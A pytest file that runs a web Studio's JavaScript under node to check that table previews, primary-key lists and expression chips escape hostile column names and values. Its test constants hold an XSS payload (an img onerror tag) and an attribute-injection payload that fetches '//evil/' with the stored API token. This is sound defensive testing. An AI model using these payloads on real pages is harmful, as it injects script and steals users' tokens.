"""The table preview shows the source's own data, so every column name and value in it is
escaped, in attributes too. Before, a value written into a source row could put markup
(and script) into the Studio when someone previewed that table."""

from __future__ import annotations

import json
import shutil
import subprocess
from html.parser import HTMLParser
from pathlib import Path

import pytest

PAGE = (Path(__file__).resolve().parents[1] / "src" / "r2g" / "ui" / "static"
        / "index.html").read_text(encoding="utf-8")

HOSTILE_COLUMN = "name<img src=x onerror=alert(1)>"
HOSTILE_VALUE = "\" onmouseover=\"fetch('//evil/?t='+localStorage.getItem('r2g.apiToken'))"


def _top_level(name: str, *, prefix: str = "function") -> str:
    start = PAGE.index(f"\n{prefix} {name}(")
    return PAGE[start:PAGE.index("\n}\n", start) + 3]


class _Tags(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.tags: list[tuple[str, dict[str, str | None]]] = []
        self.text: list[str] = []

    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, dict(attrs)))

    def handle_data(self, data):
        self.text.append(data)


def _preview(rows: list[dict], source: str = "src", table: str = "t") -> tuple[str, str]:
    """Run the page's own previewTable under node: the modal's HTML and the URL it fetched."""
    node = shutil.which("node")
    assert node, "node is required: this test runs the Studio's JavaScript"
    script = (_top_level("_htmlEscape") + _top_level("escHtml")
              + _top_level("previewTable", prefix="async function") + f"""
let fetched = null, body = null;
const apiFetch = async (url) => {{ fetched = url; return {{ rows: {json.dumps(rows)} }}; }};
const openModal = (title, html) => {{ body = html; }};
const toast = () => {{}};
const errorDetail = (e) => String(e);
previewTable({json.dumps(source)}, {json.dumps(table)})
  .then(() => process.stdout.write(JSON.stringify({{ fetched, body }})));
""")
    out = subprocess.run([node, "-"], input=script, capture_output=True, text=True,
                         check=True, timeout=30).stdout
    result = json.loads(out)
    return result["body"], result["fetched"]


def test_hostile_column_names_and_values_stay_text():
    html, _ = _preview([{HOSTILE_COLUMN: HOSTILE_VALUE, "ok": None}])
    parsed = _Tags()
    parsed.feed(html)
    assert {tag for tag, _ in parsed.tags} <= {"div", "table", "thead", "tr", "th", "tbody",
                                               "td", "span"}
    for tag, attrs in parsed.tags:
        if tag == "td":
            assert set(attrs) == {"title"}, attrs
    titles = [attrs["title"] for tag, attrs in parsed.tags if tag == "td"]
    assert titles[0] == HOSTILE_VALUE  # the whole value, read back as one attribute
    assert HOSTILE_COLUMN in parsed.text and HOSTILE_VALUE in parsed.text


def test_the_preview_url_encodes_source_and_table_names():
    _, url = _preview([{"a": 1}], source="crm/x", table="a b?c")
    assert url == "/api/sources/crm%2Fx/preview/a%20b%3Fc?limit=20"


@pytest.mark.parametrize("fragment", ["<th>${c}</th>", 'title="${String(v'])
def test_the_unescaped_forms_are_gone(fragment):
    assert fragment not in _top_level("previewTable", prefix="async function")


def test_the_table_panel_and_expression_chips_escape_source_names():
    """Two more places the Studio writes a source's names as HTML: the table panel's
    primary-key list, shown whenever a table is clicked (under a control plane too,
    where the preview is refused), and the expression editor's column chips."""
    node = shutil.which("node")
    assert node, "node is required: this test runs the Studio's JavaScript"
    name = "id" + HOSTILE_COLUMN
    tables = [{"name": "t", "pk": [name],
               "columns": [{"name": name, "type": "text", "isPk": True}]}]
    script = (_top_level("_htmlEscape") + _top_level("escHtml")
              + _top_level("showSourceProps") + _top_level("renderExprSources") + f"""
const els = {{}};
const mk = (id) => (els[id] = els[id] || {{ id, innerHTML: '', textContent: '',
                                            querySelectorAll: () => [] }});
global.document = {{ getElementById: mk, querySelector: () => null }};
let tablesInfo = {json.dumps(tables)};
let editState = {{ collections: {{}} }};
let currentSourceName = 'src';
const CP = {{ on: false }};
const _collEntryForSourceTable = () => null;
let exprEditorState = {{ sourceTable: 't', sources: [] }};
showSourceProps('t');
renderExprSources();
process.stdout.write(JSON.stringify([els['props-body'].innerHTML, els['expr-sources'].innerHTML]));
""")
    out = subprocess.run([node, "-"], input=script, capture_output=True, text=True,
                         check=True, timeout=30).stdout
    for html in json.loads(out):
        parsed = _Tags()
        parsed.feed(html)
        assert "img" not in {tag for tag, _ in parsed.tags}, html
        assert any(name in t for t in parsed.text), html
    chips = _Tags()
    chips.feed(json.loads(out)[1])
    assert [a["data-col"] for t, a in chips.tags if t == "span"] == [name]
